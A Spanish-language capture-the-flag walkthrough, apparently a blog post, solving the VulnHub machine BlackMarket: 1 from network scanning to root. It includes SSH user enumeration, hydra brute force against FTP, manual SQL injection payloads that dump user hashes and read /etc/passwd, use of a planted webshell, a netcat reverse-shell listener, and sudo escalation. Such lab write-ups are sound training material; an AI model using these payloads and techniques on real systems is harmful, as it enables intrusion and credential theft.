---
layout: single
title: BlackMarket - VulnHub
excerpt: "La maquina BlackMarket: 1 de la plataforma de VulnHub es una maquina linux donde tendremos que crearnos un directorio con contraseñas para hacer fuerza bruta y saber la contraseña de un usuario valido del sistema ademas tendremos que explotar una sqli basada en error manualmente gracias a eso podremos obtener los hashes de los usuarios tendremos que crackearlos tendremos que conectarnos a squirrelmail y abusar de un backdoor creado por un usuario para poder ganar acceso ala maquina y la escalada vamos a abusar de un privilegio a nivel de sudoers"
date: 2023-04-02
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-blackmarket/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - FTP Brute Force
  - SQLI 
  - Cracking Hashes
  - Squirrelmail
  - Backdoor
  - Sudoers privilege
---

<p align="center">
<img src="/assets/images/vh-writeup-blackmarket/logo.png">
</p>


```bash
❯ sudo arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.1.94
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.69	80:30:49:81:dc:ad	(Unknown)
192.168.1.152	00:0c:29:83:4b:3c	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.1.152
PING 192.168.1.152 (192.168.1.152) 56(84) bytes of data.
64 bytes from 192.168.1.152: icmp_seq=1 ttl=64 time=0.310 ms

--- 192.168.1.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.310/0.310/0.310/0.000 ms
❯ whichSystem.py 192.168.1.152

192.168.1.152 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p21,22,80,110,143,993,995 192.168.1.152 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 18:16 CST
Nmap scan report for 192.168.1.152
Host is up (0.00042s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.2
22/tcp  open  ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 a99884aa907ef1e6bec0843efaaa838a (DSA)
|   2048 075c7715305a17958e0f91f02d0bc37a (RSA)
|   256 2f9c29b5f5dcf495076d41eef90d15b8 (ECDSA)
|_  256 24ac30c7797f43ccfc23dfeadbbb4acc (ED25519)
80/tcp  open  http       Apache httpd 2.4.7 ((Ubuntu))
|_http-title: BlackMarket Weapon Management System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.7 (Ubuntu)
110/tcp open  pop3       Dovecot pop3d
|_pop3-capabilities: TOP AUTH-RESP-CODE STLS SASL PIPELINING UIDL CAPA RESP-CODES
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap       Dovecot imapd (Ubuntu)
|_imap-capabilities: ID more have post-login IDLE SASL-IR ENABLE listed Pre-login capabilities LOGINDISABLEDA0001 OK LITERAL+ IMAP4rev1 LOGIN-REFERRALS STARTTLS
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2017-11-01T07:05:35
|_Not valid after:  2027-11-01T07:05:35
995/tcp open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2017-11-01T07:05:35
|_Not valid after:  2027-11-01T07:05:35
MAC Address: 00:0C:29:83:4B:3C (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
❯ nmap --script=http-enum -p80 192.168.1.152 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 18:19 CST
Nmap scan report for 192.168.1.152
Host is up (0.00038s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail
MAC Address: 00:0C:29:83:4B:3C (VMware)
```

## Enumeracion

Tecnologias y servicios que corren la web

```ruby
❯ whatweb http://192.168.1.152
http://192.168.1.152 [200 OK] Apache[2.4.7], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.1.152], JQuery, PasswordField[password], Script, Title[BlackMarket Weapon Management System], X-UA-Compatible[IE=edge]
```

Esta es la pagina `web` vemos un panel de login

![](/assets/images/vh-writeup-blackmarket/1.png)

La version de `ssh` es vulnerable por que podemos enumerar usuarios de la maquina

```bash
❯ searchsploit ssh user enumeration
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
❯ searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
File Type: Python script, ASCII text executable

Copied to: /home/miguelrega7/VulnHub/BlackMarket/exploits/45939.py


❯ mv 45939.py ssh_user_enumeration.py
```

```bash
❯ python2.7 ssh_user_enumeration.py -h 2>/dev/null
usage: ssh_user_enumeration.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```

Vamos a probarlo y funciona

```bash
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 root 2>/dev/null
[+] root is a valid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 root2 2>/dev/null
[-] root2 is an invalid username
```

Pero bueno cuando tengamos algun usuario podremos validarlo pero por ahora nos enfocaremos en la parte web tambien puedes usar un wordlists con `usuarios`

Si vemos en codigo fuente de la pagina encontramos esto esta en `base64`

![](/assets/images/vh-writeup-blackmarket/2.png)

`flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=} -->`

```bash
❯ echo -n "Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=" | base64 -d; echo
CIA - Operation Treadstone
```

>
* **Informacion sobre la maquina:** La maquina no es una representacion real del mercado negro solo es un CTF.
>

![](/assets/images/vh-writeup-blackmarket/3.png)

Al parecer hay una serie de eso

<https://bourne.fandom.com/wiki/Operation_Treadstone>

Estos tal vez puedan ser usuarios validos por que es un `CTF` asi que lo que vamos a hacer es aprovecharnos del `script` para que nos diga si los usuario son validos

![](/assets/images/vh-writeup-blackmarket/4.png)

Solo `nicky` es valida 

```python
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 richard 2>/dev/null
[-] richard is an invalid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 ward 2>/dev/null
[-] ward is an invalid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 alexander 2>/dev/null
[-] alexander is an invalid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 albert 2>/dev/null
[-] albert is an invalid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 neil 2>/dev/null
[-] neil is an invalid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 nicky 2>/dev/null
[+] nicky is a valid username
❯ python2.7 ssh_user_enumeration.py 192.168.1.152 daniel 2>/dev/null
[-] daniel is an invalid username
```

Podemos usar `cewl` para crearnos un diccionario con posibles contraseñas

Vamos a usar esta web

<https://bourne.fandom.com/wiki/Operation_Treadstone>

```bash
❯ cewl -w diccionario.txt https://bourne.fandom.com/wiki/Operation_Treadstone -d 0
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

❯ ls
 diccionario.txt
❯ cat diccionario.txt | wc -l
706
```

Podemos usar `hydra` 

```bash
❯ catn users.txt
richard
nicky
daniel
neil
albert
alexander
ward
```

Vamos a hacer fuerza bruta al `ftp` primero y bueno `nicky` su contraseña es `CIA`  

```bash
❯ hydra -L users.txt -P diccionario.txt ftp://192.168.1.152 -t 20
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-02 18:45:10
[DATA] max 20 tasks per 1 server, overall 20 tasks, 4942 login tries (l:7/p:706), ~248 tries per task
[DATA] attacking ftp://192.168.1.152:21/
[STATUS] 340.00 tries/min, 340 tries in 00:01h, 4602 to do in 00:14h, 20 active
[21][ftp] host: 192.168.1.152   login: nicky   password: CIA
```

Tambien podemos probar las credenciales por `ssh`

Solo es para `ftp`

```bash
❯ ssh nicky@192.168.1.152
The authenticity of host '192.168.1.152 (192.168.1.152)' can't be established.
ECDSA key fingerprint is SHA256:nLKwzpDNQEhRq5jOFPKwE9zjnWCWLJDSEJD5hTT3ojw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.152' (ECDSA) to the list of known hosts.
nicky@192.168.1.152's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Apr  3 04:05:47 AEST 2023

  System load: 0.0               Memory usage: 7%   Processes:       185
  Usage of /:  21.0% of 8.50GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Nov 16 21:50:52 2017 from 192.168.95.128
=== WARNING CIA: THIS ACCOUNT IS LIMITED TO FTP ACCESS ONLY ====
Connection to 192.168.1.152 closed.
```

Las credenciales no son correctas en el panel de autenticacion

![](/assets/images/vh-writeup-blackmarket/5.png)

Entonces nos vamos a conectar por `ftp` ya que no hay otro lugar donde sean correctas

```bash
❯ ftp 192.168.1.152
Connected to 192.168.1.152.
220 (vsFTPd 3.0.2)
Name (192.168.1.152:miguelrega7): nicky
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Nov 06  2017 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Nov 09  2017 ImpFiles
226 Directory send OK.
ftp> cd ImpFiles
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             216 Nov 12  2017 IMP.txt
226 Directory send OK.
ftp> 
```

Vamos a descargarnos el `.txt` y vemos otra `flag` y un mensaje nos dice que vamos por buen camino sin embargo no tengo idea del mercado negro de la CIA `Vehical workshop` debes descubrirlo y hackearlo

```bash
ftp> get IMP.txt
local: IMP.txt remote: IMP.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for IMP.txt (216 bytes).
226 Transfer complete.
216 bytes received in 0.02 secs (12.5753 kB/s)
ftp> quit
221 Goodbye.
❯ catn IMP.txt
flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}

If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!
```

```bash
❯ echo -n "Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy" | base64 -d; echo
Congrats Proceed Further
```

Vamos a aplicar `fuzzing` aunque ya tengamos rutas validas que nos reporto `nmap` de antes la ruta `squirrelmail` nos lleva a un panel de login

```bash
❯ gobuster dir -u http://192.168.1.152 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.152
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/04/02 19:04:49 Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 286]
/user/                (Status: 302) [Size: 0] [--> ../index.php]
/admin/               (Status: 302) [Size: 0] [--> ../index.php]
/upload/              (Status: 403) [Size: 287]                 
/css/                 (Status: 403) [Size: 284]                 
/db/                  (Status: 403) [Size: 283]                 
/vendor/              (Status: 403) [Size: 287]                 
/dist/                (Status: 403) [Size: 285]                 
/squirrelmail/        (Status: 302) [Size: 0] [--> src/login.php]
```

![](/assets/images/vh-writeup-blackmarket/6.png)

Si probamos con el usuario y contraseña `nicky:CIA` nos da un error

![](/assets/images/vh-writeup-blackmarket/7.png)

Bueno si recordamos en el `.txt` que descargamos de `ftp` vimos que nos decian sobre un `Vehical Workshop` si probamos poniendo como ruta tipo `vworkshop, vehicalworkshop v_workshop, vehical_workshop` por que es un `CTF` funciona con esta ruta

![](/assets/images/vh-writeup-blackmarket/8.png)

No funcionan las credenciales que teniamos

![](/assets/images/vh-writeup-blackmarket/9.png)

Vemos que hay una parte donde venden piezas para autos

![](/assets/images/vh-writeup-blackmarket/10.png)

Si le damos en `more` vemos esto y la `url` ya es interesante 

![](/assets/images/vh-writeup-blackmarket/11.png)

Si cambiamos el numero funciona

![](/assets/images/vh-writeup-blackmarket/12.png)

Si probamos una simple `inyeccion` para que tarde 5 segundos en responder funciona le concatenamos el numero `1` por que el producto existe

```mysql
1' and sleep(5)-- -
```

![](/assets/images/vh-writeup-blackmarket/13.png)

Si hacemos esta `query` para ver si hay columnas no nos muestra nada

![](/assets/images/vh-writeup-blackmarket/14.png)

Pero si ponemos `2` si me la muestra entonces podemos aprovecharnos de la imagen para saber cuando es correcto

![](/assets/images/vh-writeup-blackmarket/15.png)

Si ponemos `8` ya no sale la imagen pero puse `7` y si salieron entonces hay `7`

![](/assets/images/vh-writeup-blackmarket/16.png)

Bueno no me muestra nada vamos a ocacionar un error para ver que pasa

![](/assets/images/vh-writeup-blackmarket/17.png)

Si ocasionamos un error vemos nuestros numeros reflejados en la web

![](/assets/images/vh-writeup-blackmarket/18.png)

Y bueno es vulnerable

![](/assets/images/vh-writeup-blackmarket/19.png)

Vamos a ver los nombres de las bases de datos y usaremos `group_concat` para que nos concatene todos los nombres de las bases de datos en ese mismo campo

![](/assets/images/vh-writeup-blackmarket/20.png)

Ahora vamos a enumerar las tablas para la base de datos `BlackMarket`

```bash
192.168.1.152/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(table_name),5,6,7 from information_schema.tables where table_schema='BlackMarket'-- -
```

Estas son las tables

![](/assets/images/vh-writeup-blackmarket/21.png)

Ahora vamos a enumerar las columnas de `flag` a ver si hay algo interesante

```bash
-1' union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema='BlackMarket' and table_name='flag'-- -
```

Encontramos esto

>
* **Perdon:** No se que paso con la imagen pero igual veran el resultado cuando ejecuten la query ustedes
>

![](/assets/images/vh-writeup-blackmarket/22.png)

Tambien podemos probar si podemos ver el `/etc/passwd` con `load_file`

```bash
-1' union select 1,2,load_file("/etc/passwd"),group_concat(column_name),5,6,7 from information_schema.columns where table_schema='BlackMarket' and table_name='flag'-- -
```

Y si podemos

![](/assets/images/vh-writeup-blackmarket/22.png)

Vamos a ver las columnas y nada interesante

![](/assets/images/vh-writeup-blackmarket/23.png)

Encontramos mejores cosas de la tabla `user`

```sql
=-1' union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema='BlackMarket' and table_name='user'-- -
```

![](/assets/images/vh-writeup-blackmarket/24.png)

Ahora podemos ver los usuarios con sus `hashes`

```sql
-1' union select 1,2,3,group_concat(username,0x3a,password),5,6,7 from BlackMarket.user-- -
```

Parece que estan en `MD5`

![](/assets/images/vh-writeup-blackmarket/25.png)

```bash
❯ catn hashes
admin:cf18233438b9e88937ea0176f1311885
user:0d8d5cd06832b29560745fe4e1b941cf
supplier:99b0e8da24e29e4ccb5d7d76e677c2ac
jbourne:28267a2e06e312aee91324e2fe8ef1fd
bladen :cbb8d2a0335c793532f9ad516987a41c
```

Vamos a crackearlos

```bash
❯ cat hashes | awk '{print $2}' FS=":" | xclip -sel clip
```

<https://hashes.com/en/decrypt/hash>

Tenemos estas contraseñas

![](/assets/images/vh-writeup-blackmarket/26.png)

Vamos a ver con la contraseña de `admin:BigBossCIA` en el primer panel de login

Tenemos la `flag4`

![](/assets/images/vh-writeup-blackmarket/27.png)

```bash
❯ echo -n "bm90aGluZyBpcyBoZXJl" | base64 -d; echo
nothing is here
```

Y bueno una vez al darle click al boton azul vemos esto

![](/assets/images/vh-writeup-blackmarket/28.png)

Podemos probar la pista que nos dieron de `jbourne:?????` por que tenemos el usuario

![](/assets/images/vh-writeup-blackmarket/29.png)

Funciona

![](/assets/images/vh-writeup-blackmarket/30.png)

Tenemos la `flag5` y nos dice que no puedo decodear el mensaje

![](/assets/images/vh-writeup-blackmarket/31.png)

```bash
❯ echo -n "RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=" | base64 -d; echo
Everything is encrypted
```

Vamos a usar esta utilidad

<https://www.quipqiup.com/>

Nos dejo un `backdoor` ya que nos dice que si estamos leyendo eso los mas probable es que este muerto

![](/assets/images/vh-writeup-blackmarket/32.png)

Esto nos dice

![](/assets/images/vh-writeup-blackmarket/33.png)

Vamos a ver donde esta el `backdoor` exactamente

```bash
❯ gobuster dir -u http://192.168.1.152/vworkshop/kgbbackdoor/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.152/vworkshop/kgbbackdoor/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/02 20:19:17 Starting gobuster in directory enumeration mode
===============================================================
/backdoor.php         (Status: 200) [Size: 561]
```

Pero la `webshell` esta protegida con contraseña

![](/assets/images/vh-writeup-blackmarket/34.png)

Vamos a ver que informacion util podemos encontrar en la imagen

```bash
❯ wget http://192.168.1.152/vworkshop/kgbbackdoor/PassPass.jpg
--2023-04-02 20:21:36--  http://192.168.1.152/vworkshop/kgbbackdoor/PassPass.jpg
Conectando con 192.168.1.152:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 201096 (196K) [image/jpeg]
Grabando a: «PassPass.jpg»

PassPass.jpg                    100%[=======================================================>] 196.38K  --.-KB/s    en 0.01s   

2023-04-02 20:21:36 (14.0 MB/s) - «PassPass.jpg» guardado [201096/201096]
```

Examinando el `output` la `Pass` estaba en la ultima `linea` parece estar en decimal asi que lo podemos convertir a hexadecimal

```bash
❯ strings PassPass.jpg | tail -n 1
Pass = 5215565757312090656
```

<https://www.rapidtables.com/convert/number/decimal-to-hex.html>

Tenemos eso

![](/assets/images/vh-writeup-blackmarket/35.png)

Y al parecer esta es la contraseña

![](/assets/images/vh-writeup-blackmarket/36.png)

`HailKGB`

Funciona estamos con `www-data`

![](/assets/images/vh-writeup-blackmarket/37.png)

Podemos ver la `flag`

```bash
❯ echo -n "Um9vdCB0aW1l" | base64 -d; echo
Root time
```

## Ganando acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Si te vas a la parte de `Network` ya te puedes enviar la reverse shell directamente y le das click a `>>`

![](/assets/images/vh-writeup-blackmarket/38.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.152] 53252
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Tratamiento de la `tty`

```bash
$ script /dev/null -c bash
www-data@Dimitri:/var/www/html/vworkshop/kgbbackdoor$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo fg;
					reset xterm
ENTER
www-data@Dimitri:/var/www/html/vworkshop/kgbbackdoor$ export TERM=xterm
www-data@Dimitri:/var/www/html/vworkshop/kgbbackdoor$ export SHELL=bash
```

```bash
www-data@Dimitri:/home$ ls -l
total 8
drwxr-xr-x 4 dimitri dimitri 4096 Nov 16  2017 dimitri
dr-xr-xr-x 4 nicky   nicky   4096 Nov  6  2017 nicky
www-data@Dimitri:/home$ 
```

Hay un `.Secret`

```bash
www-data@Dimitri:/home$ find . 2>/dev/null
.
./nicky
./nicky/ftp
./nicky/ftp/ImpFiles
./nicky/ftp/ImpFiles/IMP.txt
./nicky/.bashrc
./nicky/.profile
./nicky/.bash_logout
./nicky/.cache
./dimitri
./dimitri/mail
./dimitri/.bashrc
./dimitri/.bash_history
./dimitri/.cache
./.Mylife
./.Mylife/.Secret
www-data@Dimitri:/home$ 
```

Bueno nos da la contraseña `DimitryHateApple` y nos dice que trabajo en la `CIA` pero que no le gusta vender drogras ni armas y que va a renunciar

```bash
www-data@Dimitri:/home$ cat ./.Mylife/.Secret
I have been working on this CIA BlackMarket Project but it seems like I am not doing anything 
right for people. Selling drugs and guns is not my business so soon I will quit the job. 

About my personal life I am a sharp shooter have two kids but my wife don't like me and I am broke. Food wise I eat everything but DimitryHateApple

I will add more about later! 


 
www-data@Dimitri:/home$ 
```

Solo hay que cambiar la `y por i` `DimitriHateApple`

```bash
www-data@Dimitri:/home$ su dimitri
Password: 
dimitri@Dimitri:/home$ whoami
dimitri
dimitri@Dimitri:/home$ 

```

## Escalada de privilegios

Estamos en el grupo `sudo` y tenemos la contraseña

```bash
dimitri@Dimitri:~$ sudo su
[sudo] password for dimitri: 
root@Dimitri:/home/dimitri# whoami
root
root@Dimitri:/home/dimitri# cd /root
root@Dimitri:~# ls
THEEND.txt
```

```bash
root@Dimitri:~# cat THEEND.txt 
FINALLY YOU MADE IT! 

THANKS FOR PLAYING BOOT2ROOT CTF AND PLEASE DO MAIL ME ANY SUGGESTIONS @ acebomber@protomail.com 

THANKS SECTALKS BRISBANE FOR HOSTING MY CTF 


 (                      )
      |\    _,--------._    / |
      | `.,'            `. /  |
      `  '              ,-'   '
       \/_         _   (     /
      (,-.`.    ,',-.`. `__,'
       |/#\ ),-','#\`= ,'.` |
       `._/)  -'.\_,'   ) ))|
       /  (_.)\     .   -'//
      (  /\____/\    ) )`'\
       \ |V----V||  ' ,    \
        |`- -- -'   ,'   \  \      _____
 ___    |         .'    \ \  `._,-'     `-
    `.__,`---^---'       \ ` -'
       -.______  \ . /  ______,-
               `.     ,'            


./AcEb0mb3R_l0g0ff root@Dimitri:~# 
```


